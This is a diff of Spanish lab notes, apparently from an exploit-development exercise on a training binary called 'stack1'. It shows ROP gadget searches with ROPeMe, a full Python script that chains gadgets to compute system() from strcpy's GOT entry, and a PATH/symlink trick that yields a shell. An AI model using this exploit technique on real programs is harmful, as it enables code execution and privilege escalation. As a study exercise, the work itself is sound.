@@ -301,32 +301,73 @@ c) Hallar posición de memoria donde podamos guardar el offset calculado anterio
 	- Instrucciones que nos guarde el valor del strcpy del GOT en un registro de la pila (pop $reg1)
 	- Instrucciones para sumar el offset al valor anterior (add reg1 [reg2])
 
+3) Por último hay que hacer la llamada a la función contenida en el registro (system):
+	- Instrucciones de llamada: call reg1
 
 
+- Ahora es cuando empieza la búsqueda de "gadgets" (Eh la qui va là). Lógicamente lo que encontremos no va a coincidir exactamente con lo que necesitemos, pero podremos adaptarlo para que, con unas operaciones, haga lo que nosostros queremos. Para buscar estas instrucciones por las que vamos a ir saltando hasta conseguir la ejecución del exploit contamos con la ayuda de ROPeMe (https://github.com/packz/ropeme):
+
+ROPeMe> generate stack1 5
+Generating gadgets for stack1 with backward depth=5
+It may take few minutes depends on the depth and file size...
+Processing code block 1/1
+Generated 96 gadgets
+Dumping asm gadgets to file: stack1.ggt ...
+OK
+ROPeMe> search pop ? pop %
+Searching for ROP gadget:  pop ? pop % with constraints: []
+0x8048334L: pop eax ; pop ebx ; leave ;;
+0x8048432L: pop ebx ; pop ebp ;;
+0x8048577L: pop ebx ; pop ebp ;;
+0x8048545L: pop ebx ; pop esi ; pop edi ; pop ebp ;;
+0x8048594L: pop ecx ; pop ebx ; leave ;;
+0x8048547L: pop edi ; pop ebp ; ret ; mov ebx [esp] ;;
+0x8048547L: pop edi ; pop ebp ;;
+0x8048546L: pop esi ; pop edi ; pop ebp ; ret ; mov ebx [esp] ;;
+0x8048546L: pop esi ; pop edi ; pop ebp ;;
+ROPeMe>  search xchg %
+Searching for ROP gadget:  xchg % with constraints: []
+0x804842bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
+0x804845cL: xchg esi eax ; add al 0x8 ; call eax ; leave ;;
+ROPeMe> search add eax %
+Searching for ROP gadget:  add eax % with constraints: []
+0x8048429L: add eax 0x8049728 ; add [ebx+0x5d5b04c4] eax ;;
+0x804856eL: add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
+ROPeMe> search call eax %
+Searching for ROP gadget:  call eax % with constraints: []
+0x804845fL: call eax ; leave ;;
+
+Vamos a usar los siguiente gadgets:
+
+    (1)0x8048545L: pop ebx ; pop esi ; pop edi ; pop ebp ;;
+    (2)0x804842bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
+    (3)0x8048432L: pop ebx ; pop ebp ;;
+    (4)0x804856eL: add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
+    (5)0x804845fL: call eax ; leave ;;
+
+Copio y pego del estupendo blog de referencia para este ejercicio donde está explicado mucho mejor que si lo intentara explicar yo:
+
+"El gadget (1) lo usaremos para dar valor a los registros EBX y EDI que serán usados por el (2). Con el (2) haremos un intercambio de los valores de EAX y EDI, por lo que EAX obtendrá el valor de EDI (que controlamos). Luego, con el (2) sumaremos el valor de EAX al almacenado en [ebx+0x5d5b04c4]. Como también tenemos el control de EBX, utilizaremos este gadget para sumar el valor de EAX en donde queramos, previamente restando 0x5d5b04c4 a la dirección donde se va a escribir. Con el (3) restableceremos de nuevo el valor de EBX. Con el (4) leeremos un valor de [ebx-0xb8a0008] y se lo sumaremos a EAX. Y por ultimo, con el (5) realizaremos un salto a la dirección que apunta EAX.
+¡Menudo jaleo!
+La idea es utilizar el gadget (2) para escribir el offset entre system y strcpy en algún sitio con permisos de escritura, de forma que el registro EAX se quede con dicho offset. Luego, con el (4) sumar al offset que tenemos en EAX la dirección de strcpy obtenida de la GOT, teniendo en EAX un puntero a system. Por ultimo, con el (5), llamar a la función calculada."
 
 
-Este sería mi script final:
+- Este sería mi script final haciendo los ajustes necesarios:
 
 
 #!/usr/bin/python
 
-
 from struct import pack
-
-
 junk = "A" * 64 + "dcba" + "A" * 12  # 80 bytes
 
 ## ROP gadgets ##
-
 gadget1 = pack('<I', 0x8048545) # (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
 gadget2 = pack('<I', 0x804842b) # (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
 gadget3 = pack('<I', 0x8048432) # (3) pop ebx ; pop ebp ;;
 gadget4 = pack('<I', 0x804856e) # (4) add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
 gadget5 = pack('<I', 0x804845f) # (5) call eax ; leave ;;
 
-
 # OPERACIONES CONDICIONADAS POR LOS GADGETS
-
 
 padding = 0xcafedeef
 offset = 0xfffb3840 - 0x8			# El offset hay que calcularlo en gdb, no funciona lo anterior
@@ -355,16 +396,37 @@ rop += pack('<I', padding)		# otro valor cualquiera --> add esp 0x4
 rop += pack('<I', padding)		# otro valor cualquiera --> pop ebx
 rop += pack('<I', padding)		# otro valor cualquiera --> pop ebp
 
-
 # Por ultimo llamamos a system
 
 rop += gadget5                   # call eax ; leave ;;
 rop += pack('<I', gnu_string)    # "GNU" string
 
-
 payload = junk + rop
- 
+
 print payload
+
+- Para comprobar que funciona el èxploit tener en cuenta que le pasamos la cadena GNU que está en una determinada posición. Para averiguar la posición:
+	gdb-peda$ searchmem GNU 
+	Searching for 'GNU' in: None ranges
+	Found 17 results, display max 17 items:
+	    stack1 : 0x8048134 --> 0x554e47 ('GNU')
+	    stack1 : 0x8048154 --> 0x554e47 ('GNU')
+	    
+  Como no existe hay que crear un enlace  a sh desde esa cadena y meterle en el path:
+  $ ln -s /bin/sh GNU
+  $ ls -l GNU
+  $ export PATH=.:$PATH
+  
+  ./stack1 $(python suyo.py)
+  you have correctly got the variable to the right value
+  # 
+  
+  
+  
+
+  
+  
+
 
 
 
